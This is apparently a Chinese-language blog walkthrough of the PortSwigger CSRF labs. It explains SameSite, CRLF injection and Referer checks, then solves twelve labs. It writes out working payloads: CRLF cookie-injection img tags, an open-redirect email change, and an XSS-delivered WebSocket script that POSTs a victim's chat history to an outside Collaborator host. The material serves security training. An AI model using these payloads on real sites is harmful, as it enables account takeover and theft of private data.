---

title: PortSwigger--Cross-site request forgery
categories: [渗透靶场, PortSwigger]

---

## 知识扩展

### CSRF

![image-20240908002443909](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409080024996.png)

CSRF漏洞利用核心

1. 受害者登录站点A
2. 受害者在不退出站点A的情况下访问站点B
3. 请求包中除Cookie外不存在不可预测参数/其他参数可控
4. 跨站请求时浏览器是否能够携带用户Cookie

CSRF防范手段

1. 设置验证 HTTP Referer 字段
2. 设置验证 CSRF 令牌（token）
3. 设置验证 HTTP 头部自定义属性



### CRLF

CRLF注入是通过向HTTP请求或HTTP响应中注入回车换行符

CRLF注入攻击也称为回车换行注入，通过回车换行符\r\n（%0D，%0A）来篡改HTTP请求/响应信息

CRLF注入攻击可以使得服务端生成多个独立的HTTP响应头

在HTTP协议中，CRLF被用作行分隔符，以此来区分请求头/响应头的各个部分

```python
#例如下列的HTTP请求头部中GET和Host就是通过CRLF(\r\n)来实现区分的
GET / HTTP/1.1\r\n
Host: www.example.com\r\n
\r\n
```



###  Samesite

Samesite 属性是增强浏览器对Cookie处理的安全机制，其规定浏览器在跨站请求中是否允许向目标站点发送Cookie

```py
#比如当用户在站点example.com上请求站点attackersite.com的资源
用户浏览器请求加载attackersite.com资源时是否向attackersite.com发送example.com的cookie取决于samesite属性
```

Samesite属性三种模式

1. Samesite=Strict：同源站点请求浏览器才会携带Cookie
2. Samesite=Lax：请求方法为GET的请求会携带Cookie，POST请求中不允许携带Cookie
3. Samesite=None：完全允许浏览器发起请求时携带Cookie



### history.pushState

history.pushstate 是HTML5中History API提供的一种方法，允许开发者动态修改URL，同时还能保留当前页面状态

history.pushState 允许改变浏览器URL而不触发页面的重新加载



### Referrer-Policy

Referrer-Policy 控制浏览器的Referer头部信息，告诉服务端用户从哪个页面发起的请求，通过不同的策略限制Referer头部内容

Referrer-Policy策略（安全等级不同的请求例如：HTTPS到HTTP的请求）

1. no-referrer：请求中不发送任何Referer头部信息
2. no-referrer-when-downgrade：同等级站点之间发送完整Referer，不同等级站点不发送Referer
3. same-origin：只有目标站点和源站点同源时才发送Referer
4. strict-origin：只发送协议和域名（不发送路径和查询参数），不同等级站点间不发送Referer
5. strict-origin-when-cross-origin：同源请求发送完整Referer，跨源请求只发送协议和域名，不同等级站点不发送Referer
6. unsafe-url：总是发送完整的Referer信息（包括路径，查询参数和查询参数的内容）



### _method

_method用于将浏览器的表单提交请求伪造为其他请求方法（如PUT，DELETE等方法）

当服务器识别到请求表单中存在 _method 字段且有效，就会将实际的请求方法改为 _method 指定的方法，而不使用原来的方法



### window.open()

window.open() 是 javascript 中用于在浏览器中打开新窗口或新标签的函数，可以创建一个新的浏览器窗口或加载指定URL资源



### 单点登录

单点登录（SSO）是一种认证机制，允许用户使用一次登录操作访问多个应用或服务，无需为每个应用重复登录



## 靶场总结

1. 验证参数单一，Samesite为None，轻松实现csrf攻击篡改用户邮箱
2. 更换请求方式绕过服务端对csrf-token的校验
3. 删除整个csrf-token参数绕过服务端对csrf-token的校验
4. Csrf-token不绑定会话，更换其他用户的Csrf-token同样可通过服务端校验
5. CRLF注入篡改用户cookie，实现cookie参数可控
6. CRLF注入篡改用户cookie，实现cookie参数可控
7. 通过修改请求方法，添加参数_method=POST分别绕过Samesite属性和服务端对提交方法的限制
8. 利用重定向页面发起同源站点请求绕过Samesite=strict，参数嵌套
9. 同域站点请求绕过Samesite=strict，Xss+Csrf组合攻击
10. 由于oauth认证机制的特殊性，Google浏览器在新Cookie生成的120秒内，Samesite属性不会生效
11. Referer字段信息的校验可以尝试通过删除整个Referer字段绕过
12. Referer字段特殊内容校验可以配合设置Referrer-Policy策略以参数的方式进行提交绕过



## 1.CSRF vulnerability with no defenses

（1）用户wiener登录，开启Burpsuite代理，进行邮箱更新后观察HTTP请求

![image-20240906130239751](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061302812.png)

![image-20240906130342019](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061303091.png)

（2）change-email请求包中只存在Cookie，进入开发者模式检查站点Samesite属性为None——浏览器允许在跨站请求中发送Cookie

![image-20240906131448681](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061315787.png)

![image-20240911131654562](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111317729.png)

（3）Burpsuite生成CSRF POC

![image-20240906131625589](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061316653.png)

（4）进入 Go to exploit server 模块，复制Burpsuite生成的CSRF POC至 Body 中，点击 store 保存过后 Deliver exploit to victim成功实现CSRF篡改用户邮箱

![image-20240906191645493](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061916570.png)

## 2.CSRF where token validation depends on request method

（1）用户wiener登录，开启Burpsuite代理，进行邮箱更新后观察HTTP请求，/change-email请求包中存在csrf-token，首先推测服务端不对csrf-token进行验证，只是客户端单方面进行csrf-token的发送，尝试删除csrf-token观察服务端回显

![image-20240906162957460](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061630572.png)

![image-20240906163049290](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061630358.png)

![image-20240906165611663](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061656725.png)

（2）服务端验证csrf-token，但是对于不同的请求方法服务端的验证机制可能存在不同的策略，因此尝试修改请求方法为GET，发包过后发现当以GET方式进行请求时，服务端不校验csrf-token

![image-20240906165701955](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061657017.png)

（3）重新抓包，修改请求方式为GET，再使用Burpsuite在修改过后的请求包基础上生成CSRF POC

![image-20240906171248810](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061712882.png)

![image-20240906171412613](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061714691.png)

（4）点击 Deliver exploit to victim 后成功实现CSRF攻击修改用户绑定邮箱

![image-20240906171534649](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061715718.png)

## 3.CSRF where token validation depends on token being present

（1）用户wiener登录，开启Burpsuite代理，进行邮箱更新后观察HTTP请求，/change-email请求包中存在csrf-token，首先推测服务端不对csrf-token进行验证，只是客户端单方面进行csrf-token的发送，尝试删除csrf-token后观察服务端回显

![image-20240906172023743](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061720823.png)

![image-20240906172052634](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061720720.png)

（2）服务端验证csrf-token，更换不同的请求方法是否可以绕过服务端检测？尝试修改数据包的请求方式为GET

![image-20240906172115092](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061721170.png)

（3）删除csrf-token，修改请求方法均无法绕过服务端对csrf-token的校验，那么如果客户端不发送csrf参数，那服务端还会校验csrf-token吗？尝试删除整个csrf参数，发现服务端校验成功

![image-20240906172222394](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061722462.png)

（4）使用Burpsuite在删除csrf参数请求包基础上生成CSRF POC

![image-20240906182942569](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061829658.png)

## 4.CSRF where token is not tied to user session

（1）开启Burpsuite代理，更新用户邮箱后观察HTTP请求，在Repeate模块重放请求包，发现csrf-token只能用一次

![image-20240906183558452](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061835533.png)

（2）Burpsuite开启拦截，拦截更新邮箱请求包，记录下csrf-token后，点击 Drop 丢弃该数据包

（因为csrf-token只能用一次，如果放包过去了，csrf-token就失效了）

![image-20240906184050156](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061840226.png)

（3）登录carlos用户，开启Burpsuite拦截更新邮箱请求包，将carlos用户的csrf-token更换为wiener用户的csrf-token，发现以wiener用户的csrf-token既然可以成功修改carlos用户绑定的邮箱，说明服务端只对客户端发送的csrf-token进行验证，而不验证csrf-token是否分别绑定对应的用户账号（token不绑定会话，其他用户token可通过校验）

![image-20240906184207517](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061842580.png)

![image-20240906184215706](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061842767.png)

![image-20240906184226592](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409061842645.png)

（4）开启Burpsuite拦截功能，分别获取到carlos，wiener用户的csrf-token后生成CSRF POC

（记得复制csrf-token过后 Drop 掉数据包，否则csrf-token将会是失效的，同时记得修改POC中 csrf 和 email 的值）

![image-20240911140319919](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111403037.png)

## 5.CSRF where token is tied to non-session cookie

（1）开启Burpsuite代理，进行邮箱更新后观察HTTP请求，请求包中存在验证参数cookie-csrfkey，cookie-session和csrf-token

![image-20240911143044949](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111430051.png)

（2）多次重放确认csrf-token重复利用性，不可预测参数有点多，需要逐步测试这些参数在服务端校验中起到的作用，首先尝试删除cookie-csrfkey，服务端回显"Invalid CSRF token"，明明删除的是cookie-csrfkey，而服务端却回显csrf-token不合法，说明cookie-csrfkey与csrf-token是相互绑定在一起的，但是cookie-csrfkey是Cookie，是不可预测参数，仅仅判断出来cookie-csrfkey和csrf-token的绑定关系，依旧无法实现CSRF攻击

![image-20240911143114413](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111431532.png)

![image-20240911143141325](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111431427.png)

![image-20240911143214314](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111432415.png)

（3）既然更新请求包无法进一步利用，回到页面测试其他功能点，当在搜索框提交测试数据时，发现用户提交的测试数据是回显在服务端的响应包中的，说明用户提交数据可以影响服务端回显，那么是否能实现CRLF注入？如果存在CRLF注入的话，就可以通过CRLF注入伪造一个Set-cookie响应头，篡改用户cookie-csrfkey，实现请求参数可控

![image-20240908011617291](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409080116381.png)

（4）提交特定数据验证CRLF注入后，发现服务端响应头中，返回所设计的cookie-csrfkey值，既然Cookie-csrfkey可以控制，那么Cookie-token和Cookie-csrfkey是绑定的自然而然就也变成了可控的，唯一不可控的参数仅仅剩下cookie-seesion，可以实现CSRF攻击

![image-20240908201411336](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409082014448.png)

（5）首先生成更新邮箱的操作请求表单，该表单需要实现的功能如下

1. 需要设置csrf-token为攻击者自己的csrf-token
2. 需要实现在搜索框中自动提交构造好的搜索语句造成CRLF注入，篡改用户cookie-csrfley为攻击者的cookie-csrfley

```python
<img src="https://0a40001004f7399180b70db2009e00d7.web-security-academy.net/?search=CRLF%0d%0aSet-Cookie:csrfKey=2xZlq2crLSqdNRJ340XAcue94UilUBFa%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

![image-20240908234254815](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409082342888.png)

![image-20240908234223997](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409082342080.png)

（6）在用户点击恶意表单后，更改邮箱操作请求中的csrf-token和cookie-csrfley已经在用户毫不知情的情况下被替换成为了攻击者的csrf-token和cookie-csrfley，从而实现CSRF篡改用户邮箱

![image-20240908235608244](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409082356317.png)

## 6.CSRF where token is duplicated in cookie

（1）用户wiener登录，开启Burpsuite后进行邮箱更新，观察邮箱更新请求包：请求包中存在两个csrf-token

![image-20240909000255886](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090002957.png)

（2）分别尝试删除csrf-token，删除整个csrf参数，修改HTTP请求方法，都无法从服务端回显中得到有效信息

![image-20240909000330758](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090003827.png)

![image-20240909000344163](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090003229.png)

![image-20240909000402291](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090004364.png)

（3）对页面其他功能点进行检测，搜索框中提交测试数据，在服务端的响应包中发现用户提交的数据拼接在LastSearchteam=

![image-20240909000517386](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090005449.png)

（4）用户提交数据能够控制服务端的回显，那么是否存在CRLF注入？随后进行CRLF注入尝试发现确实存在

![image-20240909000611859](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090006946.png)

（5）恶意表单中插入img标签实现在搜索框中自动提交构造数据，构造数据实现CRLF注入，从而实现cookie-csrf可控

```python
<img src="https://0a9a00c903b1b9b284fef954006200d8.web-security-academy.net/?search=CRLF%0d%0aSet-Cookie:csrf=RcLekATVv9X1AivFwCDB3lJyIg0MhFQz%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

![image-20240909000942032](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090009125.png)

## 7.SameSite Lax bypass via method override

（1）用户wiener登录，开启Burpsuite代理后进行邮箱更新，观察更新请求包，除cookie-session外不存在不可预测参数

![image-20240909003754819](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090037894.png)

（2）常规思路，生成CSRF POC后进入Go to exploit server模块中进行CSRF攻击利用

![image-20240909003907193](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090039258.png)

（3）当点击 View exploit 进行本地预览时发现页面跳转至登录界面，说明浏览器在提交更新邮箱表单时没有携带Cookie，说白了就是服务端没有收到cookie，不认识当前提交表单的用户，所以需要用户进行登录认证

![image-20240909003941839](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090039905.png)

（4）回到账号页面进入开发者模式查看发现浏览器Samesite属性并没有为None，而是置为空，也就是设置为默认，Google chorme默认Samesite属性为Lax，当Samesite属性为Lax时，请求方法为GET时浏览器才会携带Cookie进行请求。这也就是为什么发起邮箱更新请求时浏览器没有携带Cookie的原因

![image-20240909004248128](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090042209.png)

（5）因此将邮箱绑定修改请求修改为GET请求，使得浏览器携带Cookie进行请求。当服务端回显GET请求不可用时，通过添加参数_method=POST来指明服务端将该请求作为POST请求进行解析响应

![image-20240909004622646](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090046736.png)

![image-20240909004722970](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090047038.png)

（6）Burpsuite重新在修改过后的请求包基础上生成CSRF POC

![image-20240909004858452](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409090048544.png)

## 8.SameSite Strict bypass via client-side redirect

（1）用户wiener登录，开启Burpsuite代理，更新邮箱后观察请求包，除Cookie-session参数外不存在其他不可预测参数。用户账号界面进入开发者模式检查Samesite属性Samesite属性为strict

![image-20240909101050089](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091010211.png)

![image-20240909101150442](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091011527.png)

（2）当Samesite属性为strict时，只有同源站点的请求中浏览器才会携带Cookie，所以接下来需要寻找一个能够进行重定向的页面/同域站点进行请求利用。随意进入一篇Blog，下拉至评论处，开启Burpsuite代理，提交评论数据，观察数据提交请求包：数据提交完成后，页面重定向回Blog页面

![image-20240909102027021](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091020085.png)

![image-20240909102031930](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091020999.png)

![image-20240909102309839](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091023922.png)

（3）重定向请求包中寻找执行重定向的JS代码，并在target中分析JS代码，简单来说就是重定向的路径取决于postId的值，并且postId是通过GET方式获取的

![image-20240909102421734](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091024819.png)

![image-20240909102740412](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091027500.png)

![image-20240909103210538](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091032607.png)

（4）既然postId是通过GET方式获取的，那通过传入特定的postId不就能实现重定向到特定的页面了。修改重定向数据包，利用目录穿越重定向回my-account页面（因为Blog页面的路径为xxxxx.net/post/，而my-account页面路径为xxxxx.net/my-account，所以需要通过目录穿越先返回上层目录xxxxx.net后才能正确进入xxxxx.net/my-account）

![image-20240909104159624](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091041734.png)

![image-20240909103939548](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091039599.png)

![image-20240909103944372](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091039442.png)

（5）在重定向请求包中创建CSRF POC，利用重定向回到my-account页面后，再发起更新邮箱操作请求，此时的请求来源是my-account页面，也就是同源站点的请求，因此浏览器在发起请求时会携带Cookie

```py
#注意postId参数后面内容需要进行URL编码
#进行嵌套参数URL编码的原因是防止浏览器无法正确解析或错误解析嵌套参数为第一层页面的参数
GET /post/comment/confirmation?postId=../my-account/change-email?email%3dhacker%40qq.com%26submit%3d1
```

![image-20240909111302672](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091113738.png)

![image-20240909111308142](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409091113231.png)

## 9.SameSite Strict bypass via sibling domain

（1）开启Burpsuite代理，进入Live chat页面，观察HTTP流量，在/chat响应包中检索加载/chat页面的JS文件，并在target中分析该JS文件，/chat.js文件中存在HTML编码函数，该函数过滤了大部分特殊符号报错尖括号"<"，因此该页面无法实现XSS攻击

![image-20240909212139379](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092121465.png)

![image-20240909212304335](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092123427.png)

（2）由/chat响应HTTP头中确认通信方式为Websocket全双工通信，由/chat请求包得知不可预测参数只有cookie-session

![image-20240909211335752](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092113862.png)

![image-20240909211646424](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092116507.png)

（3）检查Websocket通信记录，用户在进入Live chat时客户端会给服务端发送数据包，内容为：READY，服务端由此响应用户历史聊天记录。所以，如果/chat页面能实现CSRF攻击的话就可以窃取到其他用户的历史聊天记录

![image-20240909211453786](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092114875.png)

（4）进入开发者模式检查Samesite属性为strict，当Samesite属性为strict时，只有同源站点请求中浏览器才会携带Cookie。所以需要寻找可用的重定向页面或者同域站点进行CSRF攻击

![image-20240909214422055](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092144153.png)

（5）回到/home目录下，修改Burpsuite配置，将HTTP请求流量中隐藏的image，js，svg数据包全部显示。Ctral+F5刷新浏览器缓存，在shop.svg响应包中发现同域站点

![image-20240909220105569](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092201643.png)

![image-20240909220146943](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092201039.png)

（5）访问同域站点，提交测试数据，内容回显，随后进行XSS弹窗测试，成功实现弹窗。同域站点存在XSS弹窗攻击，如果将更新用户邮箱的操作请求嵌入XSS攻击代码中，当用户触发XSS弹窗时客户端向服务端发起更新邮箱请求，而此时客户端的操作请求来自同域站点，浏览器将会认为该请求是合法请求携带cookie对服务端进行请求

![image-20240909220312342](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092203407.png)

![image-20240909220328283](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092203341.png)

![image-20240909220428297](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092204363.png)

![image-20240909220431670](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092204733.png)

（6）首先制作更新邮箱请求表单：将lab地址协议修改为wss协议，并将Burpsuite中Collaborator服务器地址填入POC中的fetch处

更新邮箱请求表单实现的功能为：用户浏览器向服务端发起Websocket通信连接请求，当Websocket通信连接完成后向服务端请

求用户历史聊天记录，同时将服务端响应的数据包转发至Burpsuite开启的Collaborator服务器中

```py
<script>
    var ws = new WebSocket('wss://0af20052038cf1ed81658977008e0071.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://p5vx5w7gahns2nfkb7kwwomaf1ls9oxd.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![image-20240909221105065](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092211159.png)

（7）接下来在同域站点的登录请求包中制作CSRF POC：将上一步制作的恶意操作表单进行URL编码后填入参数Username，随后在修改过后的数据包基础上生成CSRF POC

```python
%3cscript%3e%0a++++var+ws+%3d+new+WebSocket(%27wss%3a%2f%2f0af20052038cf1ed81658977008e0071.web-security-academy.net%2fchat%27)%3b%0a++++ws.onopen+%3d+function()+%7b%0a++++++++ws.send(%22READY%22)%3b%0a++++%7d%3b%0a++++ws.onmessage+%3d+function(event)+%7b%0a++++++++fetch(%27https%3a%2f%2fp5vx5w7gahns2nfkb7kwwomaf1ls9oxd.oastify.com%27%2c+%7bmethod%3a+%27POST%27%2c+mode%3a+%27no-cors%27%2c+body%3a+event.data%7d)%3b%0a++++%7d%3b%0a%3c%2fscript%3e
```

![image-20240909222114490](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092221626.png)

![image-20240909222127010](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092221103.png)

（8）点击Deliver exploit to victim 将页面发送至受害者后，回到Burpsuite中的Collaborator服务器点击pull now刷新，通过服务器接收到的HTTP响应包成功窃取到carlos用户的历史聊天记录，其中的聊天记录泄露了carlos用户的密码

![image-20240909222402554](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092224676.png)

![image-20240909222433414](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409092224507.png)

## 10. SameSite Lax bypass via cookie refresh

（1）用户wiener登录，通过页面或者HTTP请求流量包可以看出站点采用oauth认证机制，由于oauth认证机制的特殊性，Google浏览器在新Cookie生成的120秒内，Samesite属性不会生效

![image-20240911012648096](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409110126222.png)

![image-20240911012853630](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409110128715.png)

（2）查看用户更新邮箱的请求包，请求包中除Cookie-session外不存在其他不可预测参数。用户账号界面进入开发者模式，检查Samesite属性为空，即默认为Lax

![image-20240911012928052](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409110129134.png)

![image-20240911012944689](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409110129800.png)

（3）要想实现CSRF攻击，需要用户进行SSO登录，刷新Cookie使得Samesite在120秒内不生效，如何实现？

1. 将用户重定向至SSO登录界面（Window.open进行自动弹窗）

```py
window.open('https://0a8700cc043140858299f69100780081.web-security-academy.net//social-login')
```

![image-20240911014948982](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409110149083.png)

（4）在服务器点击 View exploit 进行恶意表单本地预览，发现浏览器禁止window.open弹窗

![image-20240911015005277](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409110150348.png)

（5）既然无法自动实现弹窗，可以尝试点击弹窗。恶意页面中设置点击按钮，用户点击按钮时实现重定向至oauth登录页面

```PY
<p>Click Me!</p>
        <script>
            window.onclick = () => {
                window.open('https://0a8700cc043140858299f69100780081.web-security-academy.net/socal-login')
                setTimeout(updateEmail, 3000);
            }

            function updateEmail() {
                document.getElementsByTagName('form')[0].submit();
            }
        </script>
```

![image-20240911020801925](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409110208023.png)

## 11.CSRF where Referer validation depends on header being present

（1）用户wiener登录，开启Burpsuite代理，更新用户邮箱后观察邮箱更新请求包，请求包中除Cookie-session外不存在其他不可预测参数。用户账号界面进入开发者模式，检查Samesite属性为None

![image-20240910002441443](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100024544.png)

![image-20240910002505031](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100025133.png)

（2）验证参数单一，Samesite属性为None，CSRF漏洞存在较大可能，Burpsuite生成CSRF POC，Go to exploit server服务器中点击 View exploit 进行恶意表单本地预览，发现服务端对请求包中的Referer字段进行验证

![image-20240910002633642](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100026756.png)

![image-20240910002702893](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100027951.png)

（3）开启Burpsuite代理，点击Deliver exploit to victim后观察HTTP流量，在/Deliver to victim请求中可以看到Referer字段信息是来自Go to exploit server漏洞利用服务器的地址，而正常请求的Referer字段信息应该是来自实验室地址，所以服务端校验不通过回显"Invalid referer header"

![image-20240912001750766](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409120017896.png)

![image-20240912001938332](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409120019455.png)

（4）回到Burpsuite中的Repeate模块进行重放尝试，发现当删除Referer字段内容时服务端会校验无法通过，但是如果将整个Referer字段删去则服务端校验通过

![image-20240911191222598](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111912725.png)

![image-20240911191226726](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409111912810.png)

（5）因此只需要请求包中不存在Referer字段信息即可，如何实现？

1. 在恶意表单的Head部分添加meta标签告诉服务端该请求表单不存在referer字段
2. meta name = "referrer" 标签决定客户端在进行请求时是否发送当前页面的URL——Referer字段信息

![image-20240910003233904](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100032994.png)

## 12.CSRF with broken Referer validation

（1）用户wiener登录，开启Burpsuite代理，更新用户邮箱后观察邮箱更新请求包，请求包中除Cookie-session外不存在其他不可预测参数。用户账号界面进入开发者模式，检查Samesite属性为None

![image-20240910003512381](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100035473.png)

![image-20240910003526434](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100035536.png)

（2）验证参数单一，Samesite属性为None，CSRF漏洞存在较大可能，Burpsuite生成CSRF POC，Go to exploit server服务器中点击 View exploit 进行恶意表单本地预览，发现服务端对请求包中的Referer字段进行验证

![image-20240910003602832](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100036942.png)

![image-20240910003613220](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100036290.png)

（3）尝试在请求头部添加meta标签绕过，服务端依旧回显Referer信息不合法

![image-20240910003715619](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100037706.png)

![image-20240910003725114](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409100037183.png)

（4）回到Burpsuite中的Repeate模块进行重放尝试，通过删除整个Referer字段无法通过校验，那如果对Referer字段信息进行修改的话是否能得到不一样的回显信息呢？首先在Referer字段中随意添加内容观察服务端回显

![image-20240912210154671](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409122102847.png)

（5）在Referer字段中随意添加内容服务端校验居然通过了，证明服务端并没有完全校验Referer字段中的内容，只是对特殊内容是否存在进行了校验，所以接下来尝试逐步删减内容，直到服务端回显出现错误。逐步删除参数，路径和域名，当删掉域名后服务端回显校验错误

![image-20240912210412601](C:\Users\84615\AppData\Roaming\Typora\typora-user-images\image-20240912210412601.png)

![image-20240912210445205](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409122104309.png)

![image-20240912210540284](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409122105390.png)

（6）经过上面分析可知：服务端对Referer字段中域名进行校验，只要提交表单中存在实验室的域名即可通过校验，如何实现？

1. 使用history.pushState函数可以使得客户端在不重新加载页面的同时在URL中添加指定的内容（CSRF只有一次加载机会）
2. 将实验室的地址以参数的形式设置在Referer字段信息中
3. 浏览器默认的安全防护措施会将查询字符串从Referer字段删除，所以需要正确设置Referrer-Policy策略
4. 设置Referrer-Policy策略为unsafe-url：保证Referer字段中能够存在查询字符串

![image-20240910135734460](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409101357692.png)

